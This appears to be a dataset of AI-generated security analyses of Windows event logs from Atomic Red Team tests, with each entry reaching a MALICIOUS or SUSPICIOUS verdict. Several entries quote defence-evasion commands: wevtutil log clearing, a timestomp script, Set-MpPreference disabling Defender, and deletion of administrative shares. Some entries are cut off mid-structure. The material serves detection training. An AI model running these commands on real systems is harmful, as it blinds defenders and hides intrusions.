4. **Deploy Endpoint Detection Solutions**: Ensure endpoint detection and response solutions are deployed and fully operational to prevent similar activities in the future. They can help in real-time detection of malicious activities like the execution of unauthorized scripts or command-line utilities.

Create Windows System File with powershell,"## Detailed Analysis of the Logs:

### Suspicious Behavior and Indicators of Compromise:

1. **Cmd.exe and Conhost.exe Execution:**
   - Multiple instances of `cmd.exe` executing command-line operations involving a temp file (`T1564.001-10.txt`). These operations include checking for file existence and setting attributes to 'System'. Such behavior often hints at attempts to manipulate or obfuscate data, potentially indicating malicious practices such as avoiding detection.
   - The commands are executed under a high integrity level and by a user account, `admin_test`, which suggests privileged operations potentially being abused.

2. **Wevtutil.exe Usage:**
   - The `wevtutil.exe` process is being invoked to clear logs (e.g., `wevtutil cl Microsoft-Windows-Sysmon/Operational`). This is a critical IOA (Indicator of Attack), as clearing logs is typically executed to cover tracks when malicious activities have been performed.

3. **Log Clearing Events:**
   - Event logs indicate that the `System`, `Security`, and `Windows PowerShell` logs have been cleared by the `admin_test` user. This log-clearing activity (EventID 104 for System/PowerShell, EventID 1102 for Security) strongly implies an attempt at covering tracks, consistent with unauthorized or malicious activity.

4. **PowerShell Execution:**
   - The PowerShell event logs show execution of a script setting file attributes for `T1564.001-10.txt`. This type of scripting, especially around manipulating file attributes, can be used to hide files from common views, aligning with T1564.001 of MITRE ATT&CK (Hide Artifacts: Hidden Files and Directories).

5. **EdgeUpdate.exe Patterns:**
   - Multiple executions of `MicrosoftEdgeUpdate.exe` with varying command-line arguments, including updates and installations. While this might initially appear normal for an Edge update, the context (alongside other suspicious activity) warrants further investigation to confirm legitimacy.

### Consideration of Context:

- The majority of suspicious actions are performed by the `admin_test` user, who possesses administrative privileges. Such privileges can enable more severe malicious activities.
- An amalgamation of the suspicious process executions, the manipulation of file attributes, and the clearing of event logs indicates a highly concerning pattern that is consistent with adversarial behavior intending to avoid detection, known as Defense Evasion.

### Conclusion:

The logs indicate clear signs of malicious activity:

- **Malicious Intent:** The log-clearing events and the sophisticated use of cmd, PowerShell, and edge update mechanisms suggest attempts to evade detection and maintain persistence.
  
### Resolution:

- **Resolution: MALICIOUS**

### Guidance on How to Proceed:

1. **Immediate Response:**
   - Isolate the system suspected of compromise (Server002) to prevent further potential spread or data exfiltration.
   - Perform a comprehensive scan for malware and other indicators of compromise using endpoint detection and response (EDR) tools.
   - Change passwords, especially for the `admin_test` account, and ensure stronger password policies and multi-factor authentication are enforced.

2. **Further Investigation:**
   - Conduct a detailed forensic analysis on Server002 to uncover the scope and origin of the attack.
   - Review network logs to identify any unauthorized access or data transfers.

3. **Mitigation Steps:**
   - Reinforce security policies and educate users about methods employed by attackers.
   - Regularly update all systems and software to patch known vulnerabilities.
   - Strengthen logging and monitoring solutions to detect similar activities promptly in the future."
Clear Logs,"Upon reviewing the provided logs, several observations and analyses can be made:

1. **Log Clearing Events**:
   - In the System log (EventID: 104) and Security log (EventID: 1102), there are log-clearing events. The ""LogFileCleared"" event from the Security log with the user ""admin_test"" indicates that the security log was cleared by a user with administrative privileges. Similarly, the system log was cleared by the same user.
   - Cleared logs, especially security and system logs, are a red flag as they can indicate an attempt to cover tracks of unauthorized or malicious activities.

2. **Command Execution**:
   - The Sysmon logs feature the execution of several system utilities such as `HOSTNAME.EXE`, `WHOAMI.EXE`, and `wevtutil.exe`. While these utilities are legitimate, their usage patterns can inform an investigation.
   - Notably, `wevtutil` was used to clear logs in its execution lines, suggesting efforts to hide certain activities by deleting evidence from event logs.

3. **Process Creation**:
   - The repeated use of high-integrity level processes and command-line tools (e.g., `wevtutil` with the `cl` command) by the user ""admin_test"" shows a pattern consistent with system reconnaissance and log manipulation.
   - The appearance of processes like `cmd.exe` running with command-line arguments to clear logs is particularly concerning.

4. **Administrative User Activity**:
   - The user ""admin_test"" is heavily involved in these activities, executing utilities that can help in system reconnaissance and log operations. This user's behavior warrants further investigation into what actions they performed that necessitated clearing logs.

5. **Edge Update Events**:
   - Several entries show Microsoft Edge Update processes running, which, by themselves, are not unusual on a Windows system as they represent the browser updating mechanism. However, their placement within this context of log clearing and admin activities could be worth a deeper look, particularly for possible privilege elevation opportunities or abuse.

### Assessment:

Given the evidence of log tampering, high-integrity processes execution, and their orchestration by an administrative user, the activities observed in the logs appear highly suspicious. 

### Resolution: SUSPICIOUS

**Guidance**:
- Investigate the user account ""admin_test"" and any actions taken by this account closely.
- Audit all sensitive or high-privilege actions conducted by this user and correlate with the timeline of events observed.
- Implement monitoring for further unexpected `wevtutil` usage and any further clearing of logs.
- Ensure logs are configured to be sent to a remote server for redundancy and further analysis.
- Review security policies to prevent unauthorized access and log manipulation, and consider implementing role-based access controls to limit administrative privileges.

Given these precautions and continued analysis, you will be able to determine if further escalation to a MALICIOUS designation is necessary, based on any corroborative evidence of malicious activity."
DLP Evasion via Sensitive Data in VBA Macro over email,"### Detailed Analysis

Upon reviewing the provided Windows event logs from `Server002`, several activities point towards potentially malicious behavior. In particular, the behavior observed includes the clearing of event logs and PowerShell script execution often associated with reconnaissance or unauthorized actions.

#### Suspicious Activities Identified:

1. **Event Log Clearing**:
    - **System Log Clearing**: The `admin_test` user has cleared the System log at `2024-10-21 11:50:22.7519870` (`ClientProcessId: 3440`).
    - **Windows PowerShell Log Clearing**: The same user cleared the Windows PowerShell log shortly afterward at `2024-10-21 11:50:22.9237273` (`ClientProcessId: 5152`).
    - **Security Log Clearing**: The Security log was also cleared at `2024-10-21 11:50:22.8400123` (`ClientProcessId: 2428`).

   Clearing event logs is a known tactic by malicious actors to cover their tracks after conducting unauthorized operations.

2. **PowerShell Usage for Sending Emails**:
   - There's evidence of PowerShell being used to execute a script that appears to send an email (`Send-MailMessage`) with an attachment (`T1027-cc-macro.xlsm`). This activity is recorded in both the Sysmon and PowerShell logs. PowerShell is often utilized for conducting fileless attacks due to its ability to bypass traditional antivirus measures.

3. **File Hashes and Command Line Executions**:
    - Observed the execution of legitimate system utilities like `wevtutil.exe` and `HOSTNAME.EXE`. While these are legitimate utilities, their concurrent execution and the clearing of event logs signal potentially malicious intent.
    - The high integrity level under which these processes were executed (e.g., `High` integrity level) might suggest privilege usage or abuse.

4. **Use of Administrative Account**:
   - The `admin_test` account was used to perform the suspicious activities. Unauthorized use of an admin account is a common indicator of a compromised account or insider threat.

#### Assessment and Conclusion:

Given the above findings, there are clear indicators of potential malicious activity within the logs, primarily characterized by the clearing of various essential event logs and usage of PowerShell to perform actions that might involve sensitive data (e.g., sending emails with attachments without clear justification).

### Resolution: MALICIOUS

### Recommendations:

- **Immediate Actions**:
   - Isolate the affected host (`Server002`) from the network to prevent any further unauthorized activities.
   - Perform a full memory and disk forensic analysis on `Server002` to determine the scope of compromise and the exact actions taken by the user `admin_test`.

- **Long-Term Actions**:
   - Review and possibly enhance logging policies to capture and alert on log clearing activities.
   - Enforce stricter controls on PowerShell execution with logging and script-block logging enabled.
   - Institute stronger monitoring and alerting on high-integrity level process executions on critical accounts or administrative users.

The observed activities align with malicious intent given the log-clearing operations, frequent use of administrative privileges, and execution of potentially unauthorized scripts. It is advised to treat this situation with urgency to contain any further compromise.
"
Rundll32 setupapi.dll Execution,"Based on the analysis of the provided logs, several suspicious activities stand out, particularly in the Sysmon log events, which suggest potential malicious behavior:

1. **Sysmon Events Analysis:**
   - There are multiple instances of the `wevtutil.exe` process being executed. This utility is often used to query and clear event logs, which is unusual behavior and could be indicative of an attempt to cover tracks after performing malicious actions.
   - The event with `EventID 1` showing `wevtutil.exe` with command lines like `""C:\\Windows\\system32\\wevtutil.exe\"" cl Microsoft-Windows-Sysmon/Operational""`, `""cl Application""`, and `""cl System""` indicates log clearing operations. This kind of activity is commonly associated with an attempt to erase evidence of previous actions.
   - Importantly, `EventID 1102` from the Security log confirms that the security logs have been cleared by the user `admin_test`. This action is a significant red flag, as it strongly suggests the user is attempting to remove traces of potentially unauthorized activities.

2. **Process Execution:**
   - The execution of `cmd.exe` with a command line involving `rundll32.exe` and `setupapi.dll` is suspicious. `rundll32.exe` is often abused by attackers to execute malicious DLLs. The use of the INF file from a temporary directory (`AtomicRedTeam`) suggests illicit operations to execute arbitrary actions.
   - The execution of scripts or commands from unexpected or temporary directories is another indicator that deserves further scrutiny, especially when associated with known penetration testing frameworks or tools such as Atomic Red Team.

3. **Security Log Clearing:**
   - The clearing of the security and system logs, as seen in Event IDs 1102 and 104, is typically an attempt to thwart detection by removing logs that might contain evidence of compromise or policy violations.

Taken together, these actions represent a pattern that aligns with common post-exploitation activities, where an attacker attempts to achieve persistence or lateral movement within a network while leaving minimal traces.

**Resolution: MALICIOUS**
- The combination of log clearing activity, suspicious use of `wevtutil.exe`, and the execution of potentially malicious scripts/tools conclusively indicate malicious activity. It is likely that the host has been compromised.

**Guidance on How to Proceed:**
1. Initiate an incident response procedure immediately.
2. Isolate the affected host `Server002` from the network to prevent further potential lateral movement by the attacker.
3. Preserve any available system and memory state for forensic analysis.
4. Review user account activity, particularly focusing on the `admin_test` account, and consider resetting credentials.
5. Examine related logs for other signs of compromise across the network.
6. Investigate network traffic that corresponds to the timeline of these events for any signs of data exfiltration or unauthorized connections.
7. Conduct a thorough analysis to understand the breach's scope and vectors before considering redeployment of the host."
Event Viewer Registry Modification - Redirection URL,"Upon analyzing the provided Windows event logs, I have identified several key events that indicate suspicious and potentially malicious activity.

### Key Indicators:
1. **Event Log Clearing**: There are events showing the clearing of multiple logs, including Security (Event ID 1102), System (Event ID 104), and potentially others, all initiated by a user `admin_test`. 
    - **Security Log:**  
      ```
      { 
        ""EventID"": ""1102"", 
        ""SubjectUserName"": ""admin_test""
      }
      ```
    - **System Log:**  
      ```
      { 
        ""EventID"": ""104"", 
        ""SubjectUserName"": ""admin_test""
      }
      ```
   Clearing event logs without a legitimate reason is often used by attackers to erase traces of their activities and complicate forensic analysis.

2. **Suspicious Command Execution**:
   - **Registry Modification via CMD**: Execution of a command modifying the registry for the Event Viewer redirection (`reg add HKLM...`), which is a known tactic to mislead admins or analysts reviewing event logs.
     ```
     ""ProcessId"":""3468"",
     ""Image"":""C:\\Windows\\System32\\cmd.exe"",
     ""CommandLine"":""cmd.exe /c reg add ...""
     ```
   - The command line indicates the potential of redirecting Event Viewer references to notepad.exe, which is a strategy to obscure logs.

3. **Usage of `wevtutil`**:
   - Multiple instances of `wevtutil.exe` used to clear logs (`cl` command) for different channels, which correlates with logs being cleared.
     ```
     ""Image"":""C:\\Windows\\System32\\wevtutil.exe"",
     ""CommandLine"":""\""C:\\Windows\\system32\\wevtutil.exe\"" cl [Channel]""
     ```

4. **Process Execution Path and User Context**:
   - Many suspicious activities are executed under the `admin_test` account with high integrity levels, indicating potentially elevated privileges.
   - The processes initiated include `whoami.exe`, `wevtutil.exe`, and `cmd.exe`, showcasing activities consistent with privilege enumeration and log manipulation.

5. **Edge Update Activity**:
   - Legitimate Edge update processes are identified, but they span numerous entries and various sub-components, which itself isn’t unusual. However, this requires further correlation to rule out any misuse or anomalies involving legitimate services being used as an avenue for persistence or updates being manipulated.

### Assessment:
- **Event Log Manipulation**: The clearing of event logs is a major red flag for malicious activity, indicating efforts to cover tracks.
- **Registry Changes**: The registry changes to mislead or alter Event Viewer function are indicative of an intent to obscure real activities.
- **SUSPICIOUS**: While the presence of legitimate software updates and typical processes can be benign, the specific combination of events reflects behaviors often associated with malicious intent.

### Resolution:
Given the analysis above and the signs of potential cover-up actions within the system, the resolution stands at **MALICIOUS**. The cleared logs and registry manipulation strongly suggest attempts to hide harmful activities, requiring immediate investigation and response.

### Guidance for Proceeding:
- Isolate the affected machine (`Server002`) for a comprehensive forensic analysis.
- Perform a thorough review of user `admin_test` credentials and access logs to determine any unauthorized usage.
- Restore cleared event logs from backups or other monitoring systems if available.
- Inspect the system for additional indicators of compromise (IoCs) and potential backdoors or persistence mechanisms.
- Implement remediation and ensure enhanced monitoring to prevent similar incidents."
Activate Windows NoFileMenu Group Policy Feature,"Upon reviewing the provided Windows event logs, several points of concern stand out, suggesting potential malicious activity:

1. **Event Clearing**:
   - In quite a few instances, the `wevtutil.exe` utility is used to clear logs, as indicated by events with the command line usage to clear the System, Security, Application, and PowerShell logs. This is corroborated by multiple `LogFileCleared` events in the System and Security logs executed by the `admin_test` account (e.g., EventID 104 for various channels, EventID 1102 for Security log clearance).
   - Log clearing is often indicative of an attempt to hide traces of malicious activities, especially when it occurs shortly after potentially harmful events.

2. **Time Manipulation**:
   - Event 4616 and related entries show the system time being changed from a future value to a past one within a few milliseconds by `svchost.exe`. Time alteration can be part of tactics to disrupt log integrity, show incorrect timestamps, or further hide malicious actions.

3. **Privilege Escalation**:
   - Several entries (EventID 4672) indicate that the `admin_test` account is receiving a wide range of high-level privileges (e.g., SeDebugPrivilege, SeTakeOwnershipPrivilege), which are often targeted by attackers aiming to move laterally or maintain persistent access.

4. **Unusual Command Execution**:
   - The logs reveal the execution of `cmd.exe` with a registry modification command that alters `Explorer` settings (`/c reg add ... NoFileMenu`). This is another possible sign of an attempt to change user settings covertly (EventID 1, related to cmd.exe, and subsequent conhost.exe events as a host for command execution).

5. **Anomalous Logon Activity**:
   - The `LogonType 3` occurrences and use of `NTLM` authentication in quick succession, possibly from different IP addresses, may indicate lateral movement or brute-force attempts.

6. **Suspicious Parent-Child Process Relationships**:
   - Sysmon logs show `wsmprovhost.exe` (Windows Remote Management) spawning processes like `cmd.exe` for command execution and registry modification, which is commonly observed in attack scenarios exploiting remote management services.

Based on the above findings, the logs display activity patterns characteristic of malicious intent. The event log clearing actions combined with time manipulation and registry alterations signify a sophisticated attempt to compromise the system and mask the activity.

**Resolution: MALICIOUS**  
Given the evidence of log clearing, registry manipulation through unauthorized command execution, and privilege escalation, these logs point towards a malicious compromise. Immediate actions should include:
- Isolate the affected machine to prevent further damage or spread.
- Conduct a comprehensive forensic investigation to identify the attack vector and scope.
- Review user account activities, focusing on `admin_test` and others with elevated permissions.
- Implement enhanced monitoring for similar indicators in your network.
- Consider updating security policies to prevent unwarranted log clearance and privilege escalations."
Modify EnableNonTPM Registry entry,"Upon reviewing the provided Windows event logs, several points merit discussion regarding potential indicators of malicious activity:

1. **Wevtutil Usage**:
   - The logs show multiple executions of the `wevtutil` command with the `cl` (clear logs) parameter across several event logs. This command line utility is typically used for managing event logs, and clearing logs could be indicative of an attempt to hide tracks. Multiple logs cleared in quick succession typically warrant further inspection. Notably, channels cleared include `Microsoft-Windows-Sysmon/Operational`, `Application`, and `Security`.

2. **Registry Modification**:
   - A process identified as `cmd.exe` executed a command to add a registry setting (`HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\\EnableNonTPM`) using `reg.exe`. Changing registry settings, especially related to encryption policies, could be part of an attack to weaken system security configurations or facilitate unauthorized actions.

3. **Privileged Access**:
   - The operations observed were performed by a user with high integrity levels (`admin_test` at `High` integrity), suggesting they had elevated privileges, which could be misused in a malicious context.

4. **Conhost Executions**:
   - Several `conhost.exe` processes were spawned alongside these executions, which is not inherently suspicious, as `conhost.exe` handles command line interfaces, but should be considered in the broader context of the activities.

5. **Clearing of Logs**:
   - The `Security` log shows an `Event ID 1102`, which indicates that the security log was cleared. Log clearance is a known tactic for attackers to cover their tracks.

6. **Other Considerations**:
   - Normal system and application processes such as `svchost.exe`, `sppsvc.exe`, and `WmiPrvSE.exe` were also noted but they do not individually suggest anomaly in the provided context. However, they should be viewed with continuous process monitoring.

**Assessment of Overall Situation**:
The combination of clearing event logs, executing privilege-enhancing commands, and modifying potentially critical registry settings indicates a strong suspicion of malicious activity. The use of native tools like `wevtutil` and `cmd.exe` to conduct these operations is a common technique in living-off-the-land attacks, which aim to leverage legitimate system utilities for malicious purposes. There is an evident need to investigate the intent and origin of these actions further.

**Resolution**:
**MALICIOUS** - The actions observed within these logs are consistent with attempts to alter security configurations and cover traces, suggesting the system may have been compromised.

**Guidance on How to Proceed**:
1. Immediately begin a detailed investigation into the access and activities of the `admin_test` account. 
2. Examine any recent changes to registry settings and revert unauthorized changes.
3. Review endpoint security measures and ensure that they are functioning correctly.
4. Conduct an incident response exercise to identify the entry point and extent of the breach.
5. Enhance logging and monitoring controls to detect similar activities in the future.
6. Notify relevant stakeholders and consider engaging with forensic experts if necessary.

This determined course of action is critical to mitigate potential impacts and protect organizational resources."

Remove Network Share,"### Analysis

Upon reviewing the provided event logs, the following suspicious activities stand out:

1. **Event Log Clearing (Security Event ID 1102, Sysmon Event ID 1 & 5, System Event ID 104):**
   - The logs indicate that Windows event logs (Application, Security, and System) were cleared at approximately the same time (14:47:03). The process associated with this action is `wevtutil.exe` executed by the user `SERVER002\admin_test`.
   - Clearing of event logs using `wevtutil.exe` by a user account (`admin_test`) is a significant indicator of potential malicious activity as attackers often clear logs to cover their tracks after unauthorized activity.

2. **Command Execution (Sysmon Event ID 1):**
   - Several command line executions are observed, notably a `cmd.exe` running a command to delete a network share (`""cmd.exe"" /c net share \\test\share /delete`). This can be considered suspicious depending on the context and the typical usage within the environment.

3. **Time Manipulation (System Event ID 1 and 24):**
   - Observed changes in the system time matching the period around log clearings. While this isn't inherently malicious by itself, it coincides with other suspicious activities such as log clearing.

4. **Processes initiations from default tools and directories (Sysmon Events):**
   - Numerous system processes, including `conhost.exe` and `wevtutil.exe`, initiated in a short span of time under the same user context might indicate some form of automated/scripted operation.

5. **Limited PowerShell Logs:**
   - Notably, the lack of PowerShell logs could suggest attempts to execute commands via PowerShell which may not have been logged due to either bypass techniques or logging being disabled prior to execution.

### Conclusion

The set of events collectively suggest the potential of malicious activity, particularly focusing on the log clearing actions by `SERVER002\admin_test`. This aligns with tactics typically used in intrusion scenarios to maintain persistence or cover tracks. The simultaneous log clearing across different logs channels (`Application`, `Security`, and `System`) and the proximity to system time changes further raises suspicion.

Disable Administrative Share Creation at Startup,"Upon analysis of the provided Windows event logs from Server002, the following observations and assessments can be made:

### Suspicious Activities:
1. **Log File Clearance:**
   - There are multiple events indicating log files have been cleared, including the System, Security, and Windows PowerShell logs. EventID 104 in the System log and EventID 1102 in the Security log show entries where the `admin_test` user cleared the logs. This is generally considered a suspicious activity, as log file clearance can be an attempt to cover tracks after performing malicious activities.

2. **Command-Line Activity:**
   - The Sysmon logs reveal the execution of multiple instances of `wevtutil.exe` used to clear logs (`cl` parameter) for the Application, System, and Security logs. The specific use of `wevtutil.exe cl` command to clear logs raises a red flag for potential log tampering or evasion activities.
   - Additionally, a `cmd.exe` process with command line activity altering registry settings (`reg add`) was observed, which disabled auto-sharing (`AutoShareServer` and `AutoShareWks`). These registry changes can be indicative of an attempt to prevent network shares from being exposed, which could either be for security hardening or to prevent detection in a compromised system.

3. **Activities by High-Level Privileges:**
   - The user `admin_test` had engaged in activities requiring high privilege, as indicated in EventID 4672, which demonstrates extensive privileges (including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) allotted to this account. The combination of elevated privileges with the activities of clearing logs further heightens suspicion.

4. **Security Log Events:**
   - The presence of EventID 4634 indicating the log off of `admin_test` and the subsequent clearing of multiple logs shortly thereafter could suggest an attempt to terminate sessions after unauthorized activities, which warrants further investigation.

### Malicious Assessment:
- **Given the combination of log file clearance activity, the use of command-line utilities to modify system registry settings, and the presence of elevated privilege activities, there are strong indicators of intentional actions that are aligned with methods used by malicious actors to cover their tracks and maintain persistence within a compromised system.**

   - Check for any other accounts or systems that might exhibit similar patterns indicative of compromise.
   - Verify the integrity and authenticity of any executables found in unexpected contexts (e.g., `reg.exe`, `wevtutil.exe`) to ensure they haven't been tampered with.

3. **Mitigation Steps:**
   - Consider resetting credentials and passwords, whether the account is confirmed compromised or not; this includes implementing multifactor authentication where possible.
   - Update and patch any vulnerabilities on the server to mitigate potential exploits used by an attacker.
   - Harden log configurations to prevent unauthorized access or modification, implementing alerts, and increased audit log monitoring to detect similar activities in the future."
Windows - Timestomp a File,"After analyzing the provided Windows event logs from the host ""Server002,"" several indicators suggest potential malicious activity:

1. **Event Log Clearance:** 
   - Multiple instances of the event log clearance (Event IDs 104 in System and 1102 in Security logs) were observed, executed by the user ""admin_test."" The clearing of event logs is a common tactic used by malicious actors to cover their tracks after illicit activities.

2. **Suspicious PowerShell Activity:** 
   - The PowerShell logs show a suspicious command, importing a module ""timestomp.ps1"" and executing a timestomping command:
     ```
     powershell.exe & {import-module ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\timestomp.ps1""; timestomp -dest ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\kxwn.lock""}
     ```
   - Timestomping is a technique used to modify timestamps of files, which is often used to evade detection. The presence of the AtomicRedTeam path suggests potential usage of penetration testing tools or techniques.

3. **Sysmon Logs Indicating Executions of Wevtutil and Conhost:**
   - Frequent invocations of `wevtutil.exe` are observed with command line syntax clearing logs (e.g., `cl System`, `cl Security`, `cl ""Windows PowerShell""`) under the same user account, ""admin_test."" This aligns with the log clearance events noted above.

4. **Elevation of Privileges or System Access:**
   - Many processes were run under the ""NT AUTHORITY\SYSTEM"" context, which could indicate legitimate system processes or potential attempts to gain elevated privileges. Items like multiple EdgeUpdate processes are typically benign, but the context of the events surrounding them (log clearance, timestomping) raises concerns.

**Assessment:**
The combination of log clearance events, suspicious PowerShell execution, and timestomping clearly indicates an attempt to cover tracks and potentially execute unauthorized actions. This behavior is consistent with post-compromise activity by an attacker seeking to evade detection and maintain persistence.

**Resolution: MALICIOUS**

**Guidance:**
- Immediately isolate the affected host (Server002) from the network to prevent further compromise.
- Conduct a thorough forensic analysis to identify additional indicators of compromise (IOCs) and determine the extent of the breach.
- Review credentials associated with ""admin_test"" and consider them compromised; initiate password changes and audit access permissions.
- Monitor other systems for similar patterns of behavior to assess if the compromise has spread.
- Check for any unauthorized scheduled tasks, services, or startup items.
- Review recent changes to security configurations and access logs to identify potential data exfiltration or further unauthorized access.
- Enhance monitoring and logging to improve detection capabilities for similar events in the future."
Invoke CHM Shortcut Command with ITS and Help Topic,"### Detailed Analysis

Upon reviewing the provided logs from a Windows host, the following observations have been made regarding potential suspicious or malicious activity:

1. **Use of PowerShell**: 
   - Multiple instances of `powershell.exe` are invoked, some are associated with potentially suspicious command lines. Of particular note is:
     - The command `Invoke-ATHCompiledHelp` with references to CHM files may indicate PowerShell being used to execute scripts potentially hidden in help files. This is a tactic sometimes seen in scripting attacks or when executing code from CHM files.
   - The use of `PowerShell.exe` in various contexts, especially with potentially obfuscated or uncommon commands, can indicate an attempt to carry out scripted or malicious activities.

2. **Event Log Clearing**:
   - `Event ID 1102` in the Security logs indicates that the Windows event logs have been cleared. This is concerning and often a red flag for malicious activity as attackers might clear logs to cover their tracks.
   - Similarly, cleared logs from the System channel are indicated by `Event ID 104`, which is unusual without a legitimate reason.

3. **User Context**:
   - The activity happens under the user `admin_test`, which is highlighted across many events. The recurrence of sensitive operations under this user may suggest compromised credentials or malicious usage.
   - The execution of processes like `whoami.exe` and `hostname.exe` around the same timestamps as suspicious PowerShell commands also suggest reconnaissance or environment enumeration by a potentially malicious actor.

4. **Process Execution**:
   - The repeated executions of the `wevtutil.exe` utility for event log management, particularly across different log channels (Security, Application, etc.), can be suspicions. Such behavior may be used in log analysis by attackers wanting to identify or manipulate log data.

5. **Privileged Operations**:
   - Execution of commands and access with high integrity levels (as seen in the logs) indicate activities requiring elevated privileges. Given some of these operations' suspicious context, the motivations should be reviewed.

### Threats & Risks Identified

- **Event Clearing**: Cleared logs signify an effort to cover tracks and are a strong indicator of malicious intent.
- **Suspicious PowerShell Commands**: The use of potentially malicious or uncommon PowerShell scripts should be investigated further. Possible script execution or lateral movement actions need to be evaluated.
- **Potential Credential Compromise**: The persistent use of the `admin_test` account in conjunction with suspicious activities could mean credential misuse.

### Guidance and Recommendations

1. **Immediate Actions**:
   - Investigate the `admin_test` account usage for unusual access patterns, and consider resetting credentials.
   - Monitor PowerShell activity to ensure no further suspicious scripts are executed.

2. **Forensic Review**:
   - Conduct a system forensic analysis to identify any changes to system files or the presence of suspicious files that are unusual or not native to the system.
   - Cross-reference with other systems in the network for patterns of similar activity, looking for potential lateral movements.

3. **Incident Response**:
   - Engage the incident response team to assess and contain any possible breach, extending the review to similar systems if lateral movement is suspected.
   - Review and possibly enhance logging configurations to prevent unauthorized log clearing in the future.

4. **Long Term Measures**:
   - Consider enhancing security measures such as implementing advanced PowerShell logging, endpoint detection and response (EDR) tools, and stricter privilege management.

### Resolution
Given the identified suspicious behaviors and potential misuse, the resolution based on the analyzed logs would be:

**MALICIOUS**

The activities logged here strongly suggest malicious intent, likely indicating an active compromise. Immediate measures should be taken to secure systems and credentials."
Uninstall Sysmon,"Upon reviewing the provided Windows event logs, several key observations can be made regarding potential indicators of malicious activity:

### Security Logs:
- **Event ID 1102**: This event indicates that the security log was cleared. The log was cleared by a user named ""admin_test"" using the SID `S-1-5-21-3962163828-2803415714-1403596700-1006`. Clearing event logs, particularly the security log, can be a significant indicator of malicious activity as it is often done to cover tracks after unauthorized actions.

### System Logs:
- **Event ID 104**: Multiple instances of this event indicate that the system and Windows PowerShell logs have also been cleared by the same user ""admin_test"" shortly before the security log was cleared. Similar to security log clearing, this behavior could suggest an effort to remove traces of malicious activities or administrative missteps.

### Application Logs:
- **Edge Update Events**: There are two events showing that the ""edgeupdate"" service was stopped. While stopping a service isn't inherently malicious, the timing and surrounding context (such as other logs being cleared almost simultaneously) could signal potential unusual behavior, especially if stopping such services isn't typical for the environment.

### Analysis and Risks:
- The clearing of logs (security, system, and PowerShell) in quick succession by the same user raises significant suspicions. This is a common tactic used post-attack to eliminate evidence of unauthorized actions. Although the user ""admin_test"" might have legitimate reasons to perform these actions, they are considered highly suspicious without further context or justification.
- The stopping of services, such as the ""edgeupdate"", in the same timeframe, can represent unusual behavior worth investigating, especially in conjunction with log clearing.

### Conclusion and Resolution:
Based on the evidence present within these logs, the analysis concludes the following:

- **Resolution: SUSPICIOUS**

The activities documented are highly indicative of attempts to cover illegal or unauthorized actions, though no specific malicious payload or attack chain (e.g., malware execution, network intrusions) is directly visible from the logs provided. This situation warrants further investigation.

### Recommendations:
1. **Immediate Further Investigation**: Examine any remaining logs from endpoint protection, network devices, or SIEM solutions to identify associated activities, especially around the same timeframe.
2. **Review User Actions**: Investigate with the user ""admin_test"" or associated account owners/admins to verify the intent and authorization of their actions.
3. **Audit and Monitor**: Increase monitoring around privileged accounts and implement alerts for log clearing events.
4. **Security Posture Assessment**: Conduct a security assessment to ensure there are no further signs of compromise and that security controls are effectively preventing unauthorized activities.

The actions taken should clarify whether these activities were indeed benign administrative tasks or part of a malicious attempt, thus helping to mitigate any potential threats."
Tamper with Windows Defender ATP PowerShell,"Upon reviewing the provided logs, several activities are identified which may indicate potential malicious behavior:

1. **PowerShell Activity (Windows PowerShell log):**
   - The logs show multiple commands executed with PowerShell using the `Set-MpPreference` cmdlet to disable various Windows Defender protections including real-time monitoring, behavior monitoring, script scanning, and block at first seen. These actions are common tactics used by attackers to evade detection by antivirus software. Executing these commands without legitimate justification can be considered highly suspicious and potentially malicious.

2. **Application Log (Windows Defender Status):**
   - The Application logs indicate multiple instances where Windows Defender is set to a ""SECURITY_PRODUCT_STATE_SNOOZED"" state. This correlates with the PowerShell activity noted above, suggesting that Windows Defender was deliberately disabled.

3. **Sysmon Log:**
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` processes associated with clearing event logs. This can be an indication of an attempt to hide malicious activities.
   - The use of PowerShell associated with an administrative user and the high integrity level suggests elevated permissions were used, corroborating potential unauthorized privilege escalation.

4. **Security Log:**
   - Event ID 1102 indicates that the audit logs on the system have been cleared. This is typically performed by attackers to erase traces of malicious activity.

5. **System Log:**
   - The logs show multiple instances of event logs being cleared (Event ID 104), including in the System channel and the Windows PowerShell channel.

### Assessment:
The activity across these logs is highly indicative of malicious behavior. The disabling of security features alongside log clearing is a red flag. These actions, when combined with other suspicious process activities, strongly point to a potential compromise of the system.

### Threat/Risk:
- The intentional disabling of Windows Defender and clearing of event logs represent significant security threats as they suggest an attempt to disguise unauthorized activities, potentially including ongoing or planned malicious operations.
  
### Guidance:
- Immediate steps should be taken to isolate the affected system from the network to prevent any further malicious activity.
- Conduct a comprehensive forensic investigation of the system in question to confirm the presence of any malware or unauthorized activities.
- Review and enhance endpoint detection and response (EDR) capabilities to prevent and detect similar actions in the future.
- Implement strict controls and monitoring of administrative activities, especially those including PowerShell commands that modify security settings.

### Resolution:
- **MALICIOUS**: The activities observed in the logs are consistent with known malicious techniques, confirming the likelihood of a security breach. Immediate remediation and further investigation are required."
Remove Administrative Shares,"Based on the provided logs, here is the analysis and determination:

### Key Observations:

1. **Log File Clearing:**
   - **System and Security Logs Cleared:** Both System and Security logs were cleared by the user `admin_test`. This is evident from the EventLog 104 and 1102 entries in the logs, which state that `SERVER002\\admin_test`, with a high integrity level, executed the `wevtutil.exe` command to clear the logs. Clearing logs is a common tactic used by malicious actors to cover their tracks.
   - **Sysmon and Windows PowerShell Logs Cleared:** Similarly, there are indications that the Sysmon log was also targeted for clearing, as evidenced by the `wevtutil` command targeting the Sysmon operational channel.

2. **Suspicious Command Execution:**
   - Multiple entries indicate the execution of commands aimed at removing administrative shares (`net share C$ /delete`, `net share IPC$ /delete`, `net share ADMIN$ /delete`) via command prompt (`cmd.exe`). This behavior can be indicative of an attempt to disable administrative shares, which could be a prelude to or part of a malicious attack such as disabling security logging.
   - These commands were executed under the context of the same `admin_test` user, which strengthens the case for suspect activity.

3. **Privilege Level and Integrity Level:**
   - Activity is executed under a high integrity level, which demonstrates that the user `admin_test` had administrative privileges. This enables the execution of powerful system commands like `wevtutil` and `net share`.

4. **Time Change Activities:**
   - There are changes in system time (`EventID 4616`), which are logged in the Security log as well. Although time change events by themselves may not directly represent malicious activity, in combination with other observations (e.g., log file clearance), they might indicate an attempt to confuse logs order or timestamps.

